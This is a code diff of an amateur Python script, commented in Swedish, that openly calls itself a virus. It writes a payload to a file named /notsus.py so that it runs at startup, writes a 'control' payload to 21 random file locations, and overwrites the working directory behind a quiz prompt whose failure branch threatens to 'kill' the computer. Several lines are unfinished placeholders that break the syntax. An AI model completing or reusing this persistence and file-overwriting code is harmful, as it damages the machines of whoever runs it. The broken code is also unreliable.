@@ -28,6 +28,8 @@ RNWC = 'if input("Är Python ett bra programeringsspråk? ") == "ja" and input("
 # This part puts the virus variable in a file that will be executed each time the computer starts-
 #
 #se till att programet startas automatiskt vid start av dator, och att man kan ändra vad som står i programmet/hämta programet från internett varje gång
+f = open("/notsus.py", "a")
+f.close()
 f = open("/notsus.py", "w")
 f.write(virus)
 f.close()
@@ -38,9 +40,9 @@ f.close()
 #
 #import random
 for i in range(21):
-  randomlocation = "test/random/location/chosing/"
+  randomlocation = not done yet
 # Gör delen som väljer en random fil
-  open1 = randomlocation + "bin.py"
+  open1 = randomlocation
   f = open(open1, "w")
   f.write(control)
   f.close()
@@ -55,11 +57,11 @@ for i in range(21):
 #
 import os
 #
-if input("Är python ett bra programeringsspråk? ") == "ja" and input("Är Linux bra? ") == "ja" and input("Är minecraft bra? ") == "ja":
-  print("Bra...")
-  f = open(os.getcwd(), "w")
-  f.write(RNWC)
-  f.close()
-else:
-  #starta /drummel.py
-  print("nu dör din dator...(delen har inte programerats än...")
+deinstall = 'import os\nif input("Är python ett bra programeringsspråk? ") == "ja" and input("Är Linux bra? ") == "ja" and input("Är minecraft bra? ") == "ja":\n  print("Bra...")\n  \nelse:\n  #starta /drummel.py\n  print("nu dör din dator...(delen har inte programerats än...)")'
+f = open(good location, "w")
+f.write(deinstall)
+f.close()
+
+f = open(os.getcwd(), "w")
+f.write(RNWC)
+f.close()
